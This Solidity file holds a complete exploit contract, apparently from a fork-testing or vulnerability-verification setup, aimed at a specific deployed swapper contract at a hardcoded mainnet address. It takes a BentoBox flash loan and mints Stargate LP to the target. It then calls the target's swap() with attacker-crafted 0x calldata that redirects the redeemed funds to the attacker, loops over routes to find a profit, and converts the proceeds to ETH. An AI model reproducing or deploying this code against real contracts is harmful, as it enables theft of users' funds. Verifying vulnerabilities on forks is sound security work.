// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function flashLoan(IFlashBorrowerLike borrower, address receiver, IERC20Like token, uint256 amount, bytes calldata data)
        external;
    function balanceOf(IERC20Like token, address user) external view returns (uint256);
    function toAmount(IERC20Like token, uint256 share, bool roundUp) external view returns (uint256);
}

interface IStargateRouterLike {
    function addLiquidity(uint256 poolId, uint256 amountLD, address to) external;
}

interface IStargatePoolLike is IERC20Like {
    function totalLiquidity() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ITargetSwapperLike {
    function swap(
        address fromToken,
        address toToken,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom,
        bytes calldata data
    ) external returns (uint256 extraShare, uint256 shareReturned);

    function bentoBox() external view returns (address);
    function mim() external view returns (address);
    function pool() external view returns (address);
    function poolId() external view returns (uint16);
    function stargateRouter() external view returns (address);
    function underlyingToken() external view returns (address);
    function zeroXExchangeProxy() external view returns (address);
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is IFlashBorrowerLike, __AHTokenToEthMixin {
    address internal constant TARGET = 0xa5564a2d1190a141CAC438c9fde686aC48a18A79;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    uint256 internal constant BPS = 10_000;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    address internal _bentoBox;
    address internal _mim;
    address internal _underlying;
    address internal _pool;
    address internal _stargateRouter;
    uint16 internal _poolId;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ITargetSwapperLike target = ITargetSwapperLike(TARGET);
        _bentoBox = target.bentoBox();
        _mim = target.mim();
        _underlying = target.underlyingToken();
        _pool = target.pool();
        _poolId = target.poolId();
        _stargateRouter = target.stargateRouter();

        if (_bentoBox == address(0) || _mim == address(0) || _underlying == address(0) || _pool == address(0)) {
            return;
        }

        uint256 directLp = IStargatePoolLike(_pool).balanceOf(TARGET);
        uint256 bentoShare = IBentoBoxLike(_bentoBox).balanceOf(IERC20Like(_pool), TARGET);

        // Stage 1, direct-or-existing first:
        // if the swapper already has LP on the contract or in BentoBox, exploit it directly.
        if (directLp != 0 || bentoShare != 0) {
            uint8[8] memory residentExploitRoutes = [uint8(0), 1, 2, 3, 4, 5, 6, 7];
            uint16[4] memory residentSellBpsHints = [uint16(9_995), 9_990, 9_950, 9_900];

            for (uint256 i = 0; i < residentExploitRoutes.length; ++i) {
                for (uint256 j = 0; j < residentSellBpsHints.length; ++j) {
                    try this.attemptResidentRoute(residentExploitRoutes[i], residentSellBpsHints[j]) {
                        if (_profitAmount != 0) {
                            return;
                        }
                    } catch {}
                }
            }
        }

        // At this fork block the swapper has no resident LP, so the first exploit-path stage
        // is absent on-chain. The minimal public setup is to borrow MIM, swap it into Stargate's
        // underlying, mint LP directly to the vulnerable swapper, then trigger the same raw-0x
        // redemption/redirection path. This preserves the original causality while avoiding any
        // non-public balance injection.
        uint256 bentoMimLiquidity = IERC20Like(_mim).balanceOf(_bentoBox);
        if (bentoMimLiquidity == 0) {
            return;
        }

        uint256[4] memory amountHints = [
            _min(1_000 ether, bentoMimLiquidity / 10_000),
            _min(5_000 ether, bentoMimLiquidity / 2_000),
            _min(10_000 ether, bentoMimLiquidity / 1_000),
            _min(25_000 ether, bentoMimLiquidity / 400)
        ];
        uint8[6] memory fundingRoutes = [uint8(0), 1, 2, 3, 4, 5];
        uint8[8] memory exploitRoutes = [uint8(0), 1, 2, 3, 4, 5, 6, 7];
        uint16[4] memory sellBpsHints = [uint16(9_995), 9_990, 9_950, 9_900];

        for (uint256 i = 0; i < amountHints.length; ++i) {
            uint256 amount = amountHints[i];
            if (amount == 0 || amount >= bentoMimLiquidity) {
                continue;
            }

            for (uint256 j = 0; j < fundingRoutes.length; ++j) {
                for (uint256 k = 0; k < exploitRoutes.length; ++k) {
                    for (uint256 l = 0; l < sellBpsHints.length; ++l) {
                        try this.attemptFlashRoute(amount, fundingRoutes[j], exploitRoutes[k], sellBpsHints[l]) {
                            if (_profitAmount != 0) {
                                return;
                            }
                        } catch {}
                    }
                }
            }
        }
        _ahFinalizeTokenToEth();
    }

    function attemptResidentRoute(uint8 exploitRoute, uint16 sellBps) external {
        require(msg.sender == address(this), "self only");
        require(sellBps != 0 && sellBps <= BPS, "bad sell bps");

        IStargatePoolLike pool = IStargatePoolLike(_pool);
        uint256 directLp = pool.balanceOf(TARGET);
        uint256 shareFrom = IBentoBoxLike(_bentoBox).balanceOf(IERC20Like(_pool), TARGET);
        uint256 lpFromShare = shareFrom == 0 ? 0 : IBentoBoxLike(_bentoBox).toAmount(IERC20Like(_pool), shareFrom, false);
        uint256 totalLp = directLp + lpFromShare;
        require(totalLp != 0, "no resident lp");

        uint256 targetUnderlyingBefore = IERC20Like(_underlying).balanceOf(TARGET);
        uint256 sellAmount = targetUnderlyingBefore + ((_previewRedeem(pool, totalLp) * sellBps) / BPS);
        require(sellAmount > targetUnderlyingBefore, "zero sell");

        _executeExploitSwap(shareFrom, exploitRoute, sellAmount);
        _recoverProfitToMim(_exploitOutputToken(exploitRoute));
        _recordProfit();
        require(_profitAmount != 0, "no profit");
    }

    function attemptFlashRoute(uint256 amount, uint8 fundingRoute, uint8 exploitRoute, uint16 sellBps) external {
        require(msg.sender == address(this), "self only");
        require(sellBps != 0 && sellBps <= BPS, "bad sell bps");

        IBentoBoxLike(_bentoBox).flashLoan(
            IFlashBorrowerLike(address(this)),
            address(this),
            IERC20Like(_mim),
            amount,
            abi.encode(fundingRoute, exploitRoute, sellBps)
        );

        _recordProfit();
        require(_profitAmount != 0, "no profit");
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external override {
        require(msg.sender == _bentoBox, "bad bento");
        require(sender == address(this), "bad sender");
        require(token == _mim, "bad token");

        (uint8 fundingRoute, uint8 exploitRoute, uint16 sellBps) = abi.decode(data, (uint8, uint8, uint16));
        _handleFlashPlan(fundingRoute, exploitRoute, sellBps, amount, fee);
    }

    function _handleFlashPlan(uint8 fundingRoute, uint8 exploitRoute, uint16 sellBps, uint256 amount, uint256 fee)
        internal
    {
        require(sellBps != 0 && sellBps <= BPS, "bad sell bps");

        _forceApprove(_mim, SUSHISWAP_ROUTER, type(uint256).max);
        _forceApprove(_mim, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(_underlying, _stargateRouter, type(uint256).max);
        _forceApprove(_underlying, SUSHISWAP_ROUTER, type(uint256).max);
        _forceApprove(_underlying, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(USDC, SUSHISWAP_ROUTER, type(uint256).max);
        _forceApprove(USDC, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(WETH, SUSHISWAP_ROUTER, type(uint256).max);
        _forceApprove(WETH, UNISWAP_V2_ROUTER, type(uint256).max);

        uint256 targetUnderlyingBefore = IERC20Like(_underlying).balanceOf(TARGET);
        uint256 lpBefore = IStargatePoolLike(_pool).balanceOf(TARGET);

        _fundSwapperLp(fundingRoute, amount);

        uint256 lpAfter = IStargatePoolLike(_pool).balanceOf(TARGET);
        uint256 lpDelta = lpAfter - lpBefore;
        require(lpDelta != 0, "no lp minted");

        uint256 sellAmount = targetUnderlyingBefore + ((_previewRedeem(IStargatePoolLike(_pool), lpDelta) * sellBps) / BPS);
        require(sellAmount > targetUnderlyingBefore, "zero sell");

        _executeExploitSwap(0, exploitRoute, sellAmount);
        _recoverProfitToMim(_exploitOutputToken(exploitRoute));

        uint256 mimAfter = IERC20Like(_mim).balanceOf(address(this));
        require(mimAfter >= amount + fee, "repayment shortfall");
        _safeTransfer(_mim, _bentoBox, amount + fee);
        _recordProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _fundSwapperLp(uint8 fundingRoute, uint256 mimAmount) internal {
        (address router, address[] memory path) = _fundingPath(fundingRoute);
        uint256 underlyingBefore = IERC20Like(_underlying).balanceOf(address(this));

        _swapExactTokensForTokens(router, mimAmount, path);

        uint256 underlyingAmount = IERC20Like(_underlying).balanceOf(address(this)) - underlyingBefore;
        require(underlyingAmount != 0, "no underlying");
        IStargateRouterLike(_stargateRouter).addLiquidity(_poolId, underlyingAmount, TARGET);
    }

    function _executeExploitSwap(uint256 shareFrom, uint8 exploitRoute, uint256 sellAmount) internal {
        // Core exploit path:
        // 1. LP is already on the swapper or was just placed there through a public liquidity action.
        // 2. swap() redeems that LP into underlying and forwards attacker-controlled calldata to 0x.
        // 3. shareToMin = 0 allows the call to complete even though the redeemed underlying is
        //    redirected to this contract instead of remaining as MIM on the swapper.
        ITargetSwapperLike(TARGET).swap(
            address(0),
            address(0),
            address(this),
            0,
            shareFrom,
            _buildExploitPayload(exploitRoute, sellAmount)
        );
    }

    function _buildExploitPayload(uint8 exploitRoute, uint256 sellAmount) internal view returns (bytes memory) {
        bytes memory path;

        if (exploitRoute == 0) {
            path = abi.encodePacked(_underlying, uint24(100), USDC, uint24(500), _mim);
        } else if (exploitRoute == 1) {
            path = abi.encodePacked(_underlying, uint24(500), USDC, uint24(500), _mim);
        } else if (exploitRoute == 2) {
            path = abi.encodePacked(_underlying, uint24(100), USDC, uint24(3000), _mim);
        } else if (exploitRoute == 3) {
            path = abi.encodePacked(_underlying, uint24(500), WETH, uint24(3000), _mim);
        } else if (exploitRoute == 4) {
            path = abi.encodePacked(_underlying, uint24(100), USDC);
        } else if (exploitRoute == 5) {
            path = abi.encodePacked(_underlying, uint24(500), USDC);
        } else if (exploitRoute == 6) {
            path = abi.encodePacked(_underlying, uint24(500), WETH);
        } else if (exploitRoute == 7) {
            path = abi.encodePacked(_underlying, uint24(3000), WETH);
        } else {
            revert("bad exploit route");
        }

        return abi.encodeWithSelector(
            bytes4(keccak256("sellTokenForTokenToUniswapV3(bytes,uint256,uint256,address)")),
            path,
            sellAmount,
            0,
            address(this)
        );
    }

    function _exploitOutputToken(uint8 exploitRoute) internal view returns (address) {
        if (exploitRoute <= 3) {
            return _mim;
        }
        if (exploitRoute <= 5) {
            return USDC;
        }
        return WETH;
    }

    function _recoverProfitToMim(address tokenIn) internal {
        if (tokenIn == _mim) {
            return;
        }

        uint256 amountIn = IERC20Like(tokenIn).balanceOf(address(this));
        require(amountIn != 0, "no redirected asset");

        uint256 mimBefore = IERC20Like(_mim).balanceOf(address(this));

        for (uint8 routeId = 0; routeId < 8; ++routeId) {
            (bool supported, address router, address[] memory path) = _recoveryPath(tokenIn, routeId);
            if (!supported) {
                continue;
            }

            if (_trySwapExactTokensForTokens(router, amountIn, path)) {
                if (IERC20Like(_mim).balanceOf(address(this)) > mimBefore) {
                    return;
                }
            }
        }

        revert("mim recovery failed");
    }

    function _fundingPath(uint8 routeId) internal pure returns (address router, address[] memory path) {
        if (routeId == 0) {
            router = SUSHISWAP_ROUTER;
            path = new address[](3);
            path[0] = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
            path[1] = USDC;
            path[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
            return (router, path);
        }
        if (routeId == 1) {
            router = SUSHISWAP_ROUTER;
            path = new address[](3);
            path[0] = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
            path[1] = WETH;
            path[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
            return (router, path);
        }
        if (routeId == 2) {
            router = UNISWAP_V2_ROUTER;
            path = new address[](3);
            path[0] = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
            path[1] = USDC;
            path[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
            return (router, path);
        }
        if (routeId == 3) {
            router = UNISWAP_V2_ROUTER;
            path = new address[](3);
            path[0] = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
            path[1] = WETH;
            path[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
            return (router, path);
        }
        if (routeId == 4) {
            router = SUSHISWAP_ROUTER;
            path = new address[](2);
            path[0] = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
            path[1] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
            return (router, path);
        }

        router = UNISWAP_V2_ROUTER;
        path = new address[](2);
        path[0] = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
        path[1] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    }

    function _recoveryPath(address tokenIn, uint8 routeId)
        internal
        view
        returns (bool supported, address router, address[] memory path)
    {
        if (tokenIn == USDC) {
            if (routeId == 0) {
                supported = true;
                router = SUSHISWAP_ROUTER;
                path = new address[](2);
                path[0] = USDC;
                path[1] = _mim;
            } else if (routeId == 1) {
                supported = true;
                router = SUSHISWAP_ROUTER;
                path = new address[](3);
                path[0] = USDC;
                path[1] = WETH;
                path[2] = _mim;
            } else if (routeId == 2) {
                supported = true;
                router = UNISWAP_V2_ROUTER;
                path = new address[](2);
                path[0] = USDC;
                path[1] = _mim;
            } else if (routeId == 3) {
                supported = true;
                router = UNISWAP_V2_ROUTER;
                path = new address[](3);
                path[0] = USDC;
                path[1] = WETH;
                path[2] = _mim;
            } else if (routeId == 4) {
                supported = true;
                router = SUSHISWAP_ROUTER;
                path = new address[](3);
                path[0] = USDC;
                path[1] = _underlying;
                path[2] = _mim;
            } else if (routeId == 5) {
                supported = true;
                router = UNISWAP_V2_ROUTER;
                path = new address[](3);
                path[0] = USDC;
                path[1] = _underlying;
                path[2] = _mim;
            }
            return (supported, router, path);
        }

        if (tokenIn == WETH) {
            if (routeId == 0) {
                supported = true;
                router = SUSHISWAP_ROUTER;
                path = new address[](2);
                path[0] = WETH;
                path[1] = _mim;
            } else if (routeId == 1) {
                supported = true;
                router = UNISWAP_V2_ROUTER;
                path = new address[](2);
                path[0] = WETH;
                path[1] = _mim;
            } else if (routeId == 2) {
                supported = true;
                router = SUSHISWAP_ROUTER;
                path = new address[](3);
                path[0] = WETH;
                path[1] = USDC;
                path[2] = _mim;
            } else if (routeId == 3) {
                supported = true;
                router = UNISWAP_V2_ROUTER;
                path = new address[](3);
                path[0] = WETH;
                path[1] = USDC;
                path[2] = _mim;
            }
            return (supported, router, path);
        }

        if (tokenIn == _underlying) {
            if (routeId == 0) {
                supported = true;
                router = SUSHISWAP_ROUTER;
                path = new address[](2);
                path[0] = _underlying;
                path[1] = _mim;
            } else if (routeId == 1) {
                supported = true;
                router = SUSHISWAP_ROUTER;
                path = new address[](3);
                path[0] = _underlying;
                path[1] = USDC;
                path[2] = _mim;
            } else if (routeId == 2) {
                supported = true;
                router = UNISWAP_V2_ROUTER;
                path = new address[](2);
                path[0] = _underlying;
                path[1] = _mim;
            } else if (routeId == 3) {
                supported = true;
                router = UNISWAP_V2_ROUTER;
                path = new address[](3);
                path[0] = _underlying;
                path[1] = USDC;
                path[2] = _mim;
            }
        }
    }

    function _swapExactTokensForTokens(address router, uint256 amountIn, address[] memory path) internal {
        bool ok = _trySwapExactTokensForTokens(router, amountIn, path);
        require(ok, "router swap failed");
    }

    function _trySwapExactTokensForTokens(address router, uint256 amountIn, address[] memory path) internal returns (bool ok) {
        (ok,) = router.call(
            abi.encodeWithSelector(
                IUniswapV2RouterLike.swapExactTokensForTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
    }

    function _recordProfit() internal {
        uint256 mimBalance = IERC20Like(_mim).balanceOf(address(this));
        if (mimBalance > _profitAmount) {
            _profitToken = _mim;
            _profitAmount = mimBalance;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (ok) {
            return;
        }

        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok, "approve reset failed");
        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok, "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _previewRedeem(IStargatePoolLike pool, uint256 lpAmount) internal view returns (uint256) {
        if (lpAmount == 0) {
            return 0;
        }

        uint256 totalSupply = pool.totalSupply();
        if (totalSupply == 0) {
            return 0;
        }

        return (lpAmount * pool.totalLiquidity()) / totalSupply;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
